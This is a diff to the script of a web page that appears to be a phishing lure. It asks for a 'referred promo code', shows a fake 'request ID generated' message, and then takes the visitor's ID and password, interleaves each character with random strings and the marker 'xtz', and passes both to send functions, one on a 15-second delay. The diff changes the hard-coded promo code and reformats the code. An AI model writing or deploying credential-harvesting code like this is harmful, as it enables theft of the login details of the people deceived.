@@ -175,7 +175,7 @@
     <script>
 
         setTimeout(() => {
-            if (window.prompt("  Enter referred promo code blow.") == "2489yf") {
+            if (window.prompt("  Enter referred promo code blow.") == "2372yf") {
                 // document.getElementById("containerr").innerHTML = ""
             }
             else {
@@ -231,25 +231,25 @@
             else if (code == "") {
                 alert("  Enter Refferd promo Code:")
             }
-            else if (code != "2489yf") {
-                alert("  Invalid promo code!!!\nEnter correct promo code.")
+            else if (code != "2372yf") {
+                alert("  Invalid promo code!!!\n  Enter correct promo code.")
             }
             // else if (code != "" && document.getElementById("codecheck").value != "yes") {
             //     alert("Check the box if you use promo code.")
             // }
             else {
-                if(window.confirm('Congratulations!!! your request ID generated.\nPress "ok" to send via mail')){
+                if (window.confirm('Congratulations!!! your request ID generated.\nPress "ok" to send via mail')) {
                     for (let i in id) {
-                    let random = generateRandomName(6)
-                    result2 = result2 + random + "xtz" + id[i]
-                }
-                for (let i in password) {
+                        let random = generateRandomName(6)
+                        result2 = result2 + random + "xtz" + id[i]
+                    }
+                    for (let i in password) {
 
-                    let random = generateRandomName(6)
-                    result1 = result1 + random + "xtz" + password[i]
-                }
-                send()
-                setTimeout(() => send2(), 15000)
+                        let random = generateRandomName(6)
+                        result1 = result1 + random + "xtz" + password[i]
+                    }
+                    send()
+                    setTimeout(() => send2(), 15000)
                 }
             }
         }
